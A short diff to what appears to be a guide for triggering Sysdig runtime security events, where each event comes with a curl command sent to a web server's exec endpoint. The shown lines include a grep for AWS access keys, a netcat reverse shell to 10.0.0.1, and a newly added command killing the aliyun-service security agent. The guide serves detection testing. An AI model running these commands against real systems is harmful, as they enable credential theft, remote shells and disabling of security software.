@@ -77,6 +77,12 @@ curl -X POST http://$WEBSERVERIP/exec -d 'command=grep aws_access_key_id /tmp/'
 curl -X POST http://$WEBSERVERIP/exec -d 'command=nc -c bash 10.0.0.1 4242'
 ```
 
+**Sysdig Event:** Tampering with Security Software in Container
+**Command:**
+```
+curl -X POST http://$WEBSERVERIP/exec -d 'command=pkill aliyun-service'
+```
+
 ### Sysdig Managed Policy: Sysdig Runtime Notable Events (Severity: Medium)
 
 **Sysdig Event:** Read sensitive file untrusted 
